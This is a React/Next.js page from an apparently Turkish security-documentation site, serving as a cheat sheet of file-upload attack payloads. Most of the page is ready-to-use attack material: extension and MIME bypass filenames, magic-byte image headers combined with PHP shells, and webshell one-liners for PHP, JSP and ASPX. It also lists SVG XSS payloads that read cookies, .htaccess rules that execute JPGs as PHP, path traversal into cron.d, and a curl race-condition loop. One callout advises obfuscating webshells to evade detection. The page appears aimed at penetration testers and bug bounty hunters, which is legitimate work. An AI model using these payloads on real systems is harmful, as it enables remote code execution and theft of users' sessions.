"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "php-ext", title: "PHP Extension Bypass", level: 2 },
  { id: "asp-jsp", title: "ASP / JSP Extension Bypass", level: 2 },
  { id: "content-type", title: "Content-Type Bypass", level: 2 },
  { id: "magic-bytes", title: "Magic Bytes / File Signatures", level: 2 },
  { id: "webshell", title: "Webshell Patterns", level: 2 },
  { id: "svg-xss", title: "SVG XSS Payloads", level: 2 },
  { id: "htaccess", title: ".htaccess / Config Override", level: 2 },
  { id: "filename", title: "Filename Tricks", level: 2 },
  { id: "race-condition", title: "Race Condition Upload", level: 2 },
]

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function FileUploadPage() {
  return (
    <>
    <TableOfContents items={tocItems} />
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
          <Globe className="w-4 h-4" />
          <span>Web Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">File Upload Zafiyetleri</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          Dosya yükleme mekanizmalarındaki zafiyetler. Uzantı kontrolü bypass, content-type manipülasyonu,
          magic byte spoofing ve webshell yükleme teknikleri.
        </p>
      </motion.div>

      <Callout type="warning" title="Kritik Seviye">
        Unrestricted file upload genelde P1/Critical çünkü doğrudan RCE&apos;ye yol açar.
        Webshell yükleyerek sunucuda komut çalıştırılabilir.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="php-ext" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">PHP Extension Bypass</h2>
        <p className="text-muted-foreground mb-4">
          PHP dosya uzantısı kontrollerini atlatmak için kullanılan teknikler.
          Blacklist tabanlı filtrelerde alternatif uzantılar denenir.
        </p>
        <PayloadList
          title="PHP Extension Payloads"
          initialShow={8}
          payloads={[
            { code: "shell.php.jpg", note: "Double extension - Apache misconfig" },
            { code: "shell.php%00.jpg", note: "Null byte injection (PHP < 5.3.4)" },
            { code: "shell.php\\x00.jpg", note: "Null byte - raw hex" },
            { code: "shell.pHp", note: "Case variation bypass" },
            { code: "shell.php3", note: "Alternative PHP extension" },
            { code: "shell.php4", note: "Alternative PHP extension" },
            { code: "shell.php5", note: "Alternative PHP extension" },
            { code: "shell.php7", note: "PHP 7 extension" },
            { code: "shell.pht", note: "Lesser-known PHP extension" },
            { code: "shell.phtml", note: "PHP HTML extension" },
            { code: "shell.phps", note: "PHP source extension" },
            { code: "shell.php.", note: "Trailing dot - Windows" },
            { code: "shell.php ", note: "Trailing space - Windows" },
            { code: "shell.php::$DATA", note: "NTFS Alternate Data Stream" },
            { code: "shell.php%0a", note: "Newline bypass (Apache 2.4.0-2.4.29)" },
            { code: "shell.php....", note: "Multiple dots - Windows normalization" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="asp-jsp" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">ASP / JSP Extension Bypass</h2>
        <PayloadList
          title="ASP & JSP Payloads"
          initialShow={6}
          payloads={[
            { code: "shell.asp", note: "Classic ASP" },
            { code: "shell.aspx", note: "ASP.NET" },
            { code: "shell.asa", note: "ASP alternative" },
            { code: "shell.cer", note: "IIS treats as ASP" },
            { code: "shell.cdx", note: "IIS alternative" },
            { code: "shell.ashx", note: "ASP.NET handler" },
            { code: "shell.asmx", note: "ASP.NET web service" },
            { code: "shell.jsp", note: "Java Server Pages" },
            { code: "shell.jspx", note: "JSP XML format" },
            { code: "shell.jsw", note: "JSP alternative" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="content-type" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Content-Type Bypass</h2>
        <p className="text-muted-foreground mb-4">
          Sunucu Content-Type header&apos;ını kontrol ediyorsa, geçerli MIME type&apos;lar kullanılır.
        </p>
        <PayloadList
          title="MIME Type Manipulation"
          initialShow={7}
          payloads={[
            { code: "Content-Type: image/jpeg", note: "JPEG olarak gönder" },
            { code: "Content-Type: image/png", note: "PNG olarak gönder" },
            { code: "Content-Type: image/gif", note: "GIF olarak gönder" },
            { code: "Content-Type: image/svg+xml", note: "SVG - XSS vektörü" },
            { code: "Content-Type: application/octet-stream", note: "Generic binary" },
            { code: "Content-Type: text/plain", note: "Plain text olarak gönder" },
            { code: "Content-Type: application/x-httpd-php", note: "PHP MIME - bazen kabul edilir" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="magic-bytes" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Magic Bytes / File Signatures</h2>
        <Callout type="info" title="Tespit">
          Sunucu dosyanın ilk byte&apos;larını kontrol ediyorsa, geçerli magic byte&apos;lar ile
          payload&apos;ı birleştirin. Dosya hem geçerli resim hem geçerli PHP olabilir.
        </Callout>
        <PayloadList
          title="Magic Byte Payloads"
          initialShow={7}
          payloads={[
            { code: "GIF89a; + PHP payload", note: "GIF header + PHP shell" },
            { code: "\\xFF\\xD8\\xFF\\xE0 + PHP payload", note: "JPEG magic bytes + shell" },
            { code: "\\x89PNG\\r\\n\\x1A\\n + PHP payload", note: "PNG magic bytes + shell" },
            { code: "%PDF-1.4 + PHP payload", note: "PDF header + PHP" },
            { code: "BM + PHP payload", note: "BMP magic bytes + shell" },
            { code: "PK\\x03\\x04 + payload", note: "ZIP magic bytes" },
            { code: "exiftool -Comment='PAYLOAD' image.jpg", note: "EXIF metadata injection" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="webshell" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Webshell Patterns</h2>
        <Callout type="info" title="Not">
          Webshell payload&apos;ları güvenlik yazılımları tarafından algılanabilir.
          Gerçek testlerde obfuscation ve encoding teknikleri kullanılmalıdır.
        </Callout>
        <PayloadList
          title="Shell Techniques"
          initialShow={8}
          payloads={[
            { code: "system($_GET['cmd'])", note: "PHP system() one-liner" },
            { code: "shell_exec($_REQUEST['cmd'])", note: "PHP shell_exec" },
            { code: "passthru($_GET['cmd'])", note: "PHP passthru" },
            { code: "echo `$_GET[0]`", note: "PHP backtick shortest" },
            { code: "Runtime.getRuntime().exec(request.getParameter(\"cmd\"))", note: "JSP webshell" },
            { code: "Process.Start(Request[\"cmd\"])", note: "ASPX webshell" },
            { code: "IO.popen(params[:cmd]).read", note: "Ruby ERB webshell" },
            { code: "T(java.lang.Runtime).getRuntime().exec('id')", note: "Spring EL injection" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="svg-xss" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">SVG XSS Payloads</h2>
        <p className="text-muted-foreground mb-4">
          SVG dosyaları XML tabanlıdır ve JavaScript çalıştırabilir. Resim olarak yüklenip
          tarayıcıda render edildiğinde XSS tetiklenir.
        </p>
        <PayloadList
          title="SVG XSS"
          initialShow={5}
          payloads={[
            { code: '<svg onload="alert(1)"/>', note: "SVG onload event" },
            { code: "<svg><script>alert(document.cookie)</script></svg>", note: "SVG inline script" },
            { code: "<svg><foreignObject><body>...</body></foreignObject></svg>", note: "foreignObject bypass" },
            { code: '<svg><a xlink:href="javascript:alert(1)"><rect/></a></svg>', note: "SVG link XSS" },
            { code: '<svg><set attributeName="onmouseover" to="alert(1)"/>', note: "SVG set element" },
            { code: '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/>', note: "SVG animate event" },
            { code: '<svg><image href="x" onerror="alert(1)"/>', note: "SVG image error" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="htaccess" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">.htaccess / Config Override</h2>
        <PayloadList
          title="Config File Upload"
          initialShow={5}
          payloads={[
            { code: "AddType application/x-httpd-php .jpg", note: ".htaccess - JPG'leri PHP olarak çalıştır" },
            { code: "AddHandler php-script .txt", note: ".htaccess - TXT'leri PHP olarak çalıştır" },
            { code: "php_value auto_prepend_file shell.jpg", note: ".htaccess - auto prepend" },
            { code: "web.config handler override for .jpg -> ASP.NET", note: "IIS handler override" },
            { code: "security.limit_extensions =", note: "PHP-FPM - boş limit (tüm uzantılar)" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="filename" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Filename Tricks</h2>
        <PayloadList
          title="Filename Manipulation"
          initialShow={8}
          payloads={[
            { code: "../../../etc/cron.d/shell", note: "Path traversal - cron job" },
            { code: "..\\..\\..\\inetpub\\wwwroot\\shell.aspx", note: "Path traversal - Windows IIS" },
            { code: "....//....//....//etc/passwd", note: "Double encoding path traversal" },
            { code: "shell.php%00.jpg", note: "Null byte truncation" },
            { code: "shell.jpg/.php", note: "Path confusion" },
            { code: "shell.php;.jpg", note: "Semicolon bypass (IIS)" },
            { code: "shell.php#.jpg", note: "Fragment bypass" },
            { code: "shell.php%20", note: "Trailing encoded space" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="race-condition" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Race Condition Upload</h2>
        <p className="text-muted-foreground mb-4">
          Bazı uygulamalar dosyayı önce kaydedip sonra kontrol eder. Bu kısa zaman aralığında
          dosyaya erişilerek shell çalıştırılabilir.
        </p>
        <PayloadList
          title="Race Condition"
          initialShow={2}
          payloads={[
            { code: "for i in $(seq 1 100); do curl -s http://target/uploads/shell.php & done", note: "Paralel isteklerle race condition" },
            { code: "Burp Intruder ile upload + access eşzamanlı gönder", note: "Burp Intruder race condition" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Normal dosya yükleyin ve yanıtı inceleyin{"\n"}
        2. Uzantı bypass deneyin (double ext, null byte, case){"\n"}
        3. Content-Type manipülasyonu yapın{"\n"}
        4. Magic byte + payload kombinasyonu deneyin{"\n"}
        5. Yüklenen dosyanın erişim path&apos;ini bulun{"\n"}
        6. SVG/HTML XSS deneyin{"\n"}
        7. .htaccess/web.config override deneyin
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/web/deserialization" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>Deserialization</span>
        </Link>
        <Link href="/docs/api/bola" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>BOLA/IDOR</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
    </>
  )
}
